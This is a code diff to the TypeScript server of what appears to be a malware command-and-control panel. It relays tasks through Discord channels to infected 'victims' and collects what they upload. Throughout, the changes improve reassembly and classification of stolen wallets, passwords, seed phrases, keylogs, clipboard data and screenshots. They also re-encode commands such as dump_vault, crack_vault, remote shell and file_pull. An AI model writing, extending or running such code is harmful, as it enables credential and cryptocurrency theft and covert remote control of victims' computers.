@@ -1,5 +1,5 @@
 import { createHash, randomBytes } from 'node:crypto';
-import { createWriteStream } from 'node:fs';
+import { createReadStream, createWriteStream } from 'node:fs';
 import { mkdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
 import { basename, join } from 'node:path';
 import { prisma } from '../lib/db';
@@ -9,7 +9,7 @@ import { processArtifact } from './artifact';
 import { publish } from '../lib/bus';
 import { env } from '../lib/env';
 import { notify, notifyVictimNew } from './notify';
-import { isTaskQueuedAck, parseResultName } from '../lib/discord';
+import { TASK_NAMES, isTaskQueuedAck, parseResultName } from '../lib/discord';
 
 type DiscordConfig = {
   botToken?: string;
@@ -32,9 +32,12 @@ type Message = {
 
 const API = 'https://discord.com/api/v10';
 const POLL_MS = 4000;
-// A slow channel only needs presence occasionally; 120 s created too much
-// noise and Discord traffic when several agents were offline.
-const PING_MS = 600_000;
+// Below the 90 s presence window: a healthy agent answers `ping` long before
+// the panel can call it stale, while bridge traffic itself never marks online.
+export const PING_MS = 60_000;
+const PING_DELETE_MS = 45_000;
+const PART_TIMEOUT_MS = 5 * 60_000;
+const lastPingMessage = new Map<string, string>();
 const PART_RE = /^(.*)\.part(\d{3,})$/;
 
 let token = '';
@@ -188,6 +191,7 @@ async function tick(): Promise<void> {
     }
     await pollChannels();
     await dispatchTasks();
+    await checkStaleParts();
     await maybePing();
     lastError = '';
   } catch (error) {
@@ -568,8 +572,7 @@ async function handleAttachment(link: { channelId: string; victimId: string }, m
     });
     const parts = await prisma.discordPart.findMany({ where: { channelId: link.channelId, base }, orderBy: { index: 'asc' } });
     if (parts.length === 0) return;
-    const max = parts[parts.length - 1]!.index;
-    if (parts.length >= max) {
+    if (!partsComplete(parts.map((row) => row.index))) return;
       const merged = join(dir, base);
       const out = createWriteStream(merged);
       for (const row of parts) {
@@ -580,7 +583,6 @@ async function handleAttachment(link: { channelId: string; victimId: string }, m
       await prisma.discordPart.deleteMany({ where: { channelId: link.channelId, base } });
       await forEachPartCleanup(parts.map((row) => row.path));
       await ingestFile(link, `${message.id}:${base}`, base, merged);
-    }
     return;
   }
   const path = join(dir, `${message.id}-${name}`);
@@ -595,15 +597,9 @@ async function forEachPartCleanup(paths: string[]): Promise<void> {
 async function ingestFile(link: { channelId: string; victimId: string }, externalId: string, name: string, path: string): Promise<void> {
   const info = await stat(path);
   const lower = name.toLowerCase();
-  const prefix = lower.split('-')[0]!;
   const result = parseResultName(name);
   if (result) await closeTaskFromResult(link.victimId, result, path).catch(() => undefined);
-  const module = result ? 'result'
-    : lower.endsWith('.png') || prefix === 'screenshot' ? 'screenshot'
-    : prefix === 'wallets' || lower.startsWith('wallets') ? 'wallets'
-    : lower.includes('passwords') || lower.includes('keys') || lower.includes('seeds') || prefix === 'keylogs' ? 'keylogs'
-    : lower.endsWith('.zip') ? 'harvest'
-    : 'files';
+  const module = classify(name);
   const artifact = await prisma.artifact.create({
     data: {
       victimId: link.victimId,
@@ -611,14 +607,19 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
       discordMessageId: externalId,
       module,
       bytes: info.size,
-      sha256: createHash('sha256').update(await readFile(path)).digest('hex'),
+      sha256: await hashFile(path),
       containerPath: path,
       status: 'queued' as ArtifactStatus
     }
   });
   await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_received', data: { name, bytes: info.size, module } } });
-  const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : module === 'wallets' ? 'scan_wallets' : '';
-  if (taskName) {
+  // Closure follows the producing task name, not a generic extension. A ZIP
+  // pulled with file_pull must never close harvest.
+  const taskName = module === 'wallets' ? 'scan_wallets'
+    : module === 'files' ? 'file_pull'
+    : module === 'shell' ? 'shell'
+    : module;
+  if (['harvest', 'screenshot', 'scan_wallets', 'file_pull', 'shell'].includes(taskName)) {
     await prisma.task.updateMany({
       where: {
         victimId: link.victimId,
@@ -627,9 +628,65 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
         OR: [{ status: 'running' }, { status: 'error', error: { startsWith: 'timeout' } }]
       },
       data: { status: 'done', result: { artifactId: artifact.id } as never, error: null, finishedAt: new Date(), leaseUntil: null }
-    });
+    }).catch(() => undefined);
   }
   await processArtifact(artifact.id);
+}
+
+/** Module from the agent prefix; extension is only the fallback. */
+export function classify(name: string): string {
+  const lower = name.toLowerCase();
+  if (parseResultName(name)) return 'result';
+  const prefix = lower.split('-')[0]!;
+  if (prefix === 'wallets' || lower.startsWith('wallets')) return 'wallets';
+  if (prefix === 'files') return 'files';
+  if (prefix === 'shell' || prefix === 'out') return 'shell';
+  if (prefix === 'screenshot' || lower.endsWith('.png')) return 'screenshot';
+  if (prefix === 'harvest') return 'harvest';
+  if (prefix === 'clipboard') return 'clipboard';
+  if (prefix === 'keylogs' || lower.includes('passwords') || lower.includes('seeds')) return 'keylogs';
+  return 'files';
+}
+
+/** True only for a complete 1..N run with no gaps and no duplicates. */
+export function partsComplete(indices: number[]): boolean {
+  if (indices.length === 0) return false;
+  const unique = new Set(indices);
+  if (unique.size !== indices.length) return false;
+  const max = Math.max(...indices);
+  if (unique.size !== max) return false;
+  for (let index = 1; index <= max; index++) if (!unique.has(index)) return false;
+  return true;
+}
+
+async function hashFile(path: string): Promise<string> {
+  const digest = createHash('sha256');
+  for await (const chunk of createReadStream(path)) digest.update(chunk as Buffer);
+  return digest.digest('hex');
+}
+
+async function checkStaleParts(): Promise<void> {
+  const parts = await prisma.discordPart.findMany({ orderBy: { createdAt: 'asc' }, take: 500 });
+  const groups = new Map<string, typeof parts>();
+  for (const part of parts) {
+    const key = `${part.channelId}\u0000${part.base}`;
+    const list = groups.get(key) ?? [];
+    list.push(part);
+    groups.set(key, list);
+  }
+  const now = Date.now();
+  for (const list of groups.values()) {
+    const oldest = list[0]!;
+    if (now - oldest.createdAt.getTime() < PART_TIMEOUT_MS) continue;
+    const missing = partsComplete(list.map((part) => part.index)) ? 'none' : 'a hole or duplicate index';
+    const link = await prisma.discordLink.findUnique({ where: { channelId: oldest.channelId } });
+    if (link) {
+      await prisma.event.create({
+        data: { victimId: link.victimId, kind: 'artifact_failed', data: { name: oldest.base, error: `attachment_parts_incomplete: ${missing}` } }
+      }).catch(() => undefined);
+    }
+    await prisma.discordPart.deleteMany({ where: { channelId: oldest.channelId, base: oldest.base } }).catch(() => undefined);
+  }
 }
 
 const ARTIFACT_TASKS = new Set(['scan_wallets', 'screenshot', 'harvest']);
@@ -720,7 +777,7 @@ async function dispatchTasks(): Promise<void> {
     const link = task.victim.discord;
     if (!link) continue;
     const channel = link.channelId;
-    const text = commandFor(task.name, task.params as Record<string, unknown>);
+    const text = commandFor(task.name, task.params as Record<string, unknown>, task.id);
     if (!text) {
       await prisma.task.update({ where: { id: task.id }, data: { status: 'error', error: `unsupported_task: ${task.name}`, finishedAt: new Date(), leaseUntil: null } });
       continue;
@@ -746,19 +803,15 @@ async function dispatchTasks(): Promise<void> {
   }
 }
 
-function commandFor(name: string, params: Record<string, unknown>): string | null {
-  switch (name) {
-    case 'scan_wallets': return 'scan_wallets';
-    case 'harvest': return 'harvest';
-    case 'screenshot': return 'screenshot';
-    case 'clip_start': return 'clip_start';
-    case 'clip_stop': return 'clip_stop';
-    case 'dump_vault': return `dump_vault ${String(params.target ?? '')}`.trim();
-    case 'crack_vault': return `crack_vault ${String(params.target ?? '')} ${Number(params.max_seconds ?? 90)}`;
-    case 'shell': return `shell ${String(params.command ?? '')}`;
-    case 'file_pull': return `download ${String(params.path ?? '')}`;
-    default: return null;
-  }
+/**
+ * Every task travels as `task <name> <base64url-json>`: params survive
+ * intact (max_files, coins, wordlist, max_mb) and the task id lets cancel
+ * address the exact run.
+ */
+export function commandFor(name: string, params: Record<string, unknown>, taskId?: string): string | null {
+  if (!TASK_NAMES.includes(name as (typeof TASK_NAMES)[number])) return null;
+  const body = { ...params, ...(taskId ? { _task_id: taskId } : {}) };
+  return `task ${name} ${Buffer.from(JSON.stringify(body), 'utf8').toString('base64url')}`;
 }
 
 async function maybePing(): Promise<void> {
@@ -773,11 +826,13 @@ async function maybePing(): Promise<void> {
     }
     if (now - previous < PING_MS) continue;
     try {
+      const previousId = lastPingMessage.get(link.channelId);
+      if (previousId) void removeMessage(link.channelId, previousId);
       const id = await send(link, 'ping');
       if (id) {
         lastPing.set(link.channelId, now);
-        // The pong has arrived by then; keep the channel free of old pings.
-        setTimeout(() => void removeMessage(link.channelId, id), 60_000);
+        lastPingMessage.set(link.channelId, id);
+        setTimeout(() => void removeMessage(link.channelId, id), PING_DELETE_MS);
       }
     } catch {
       // channel lost
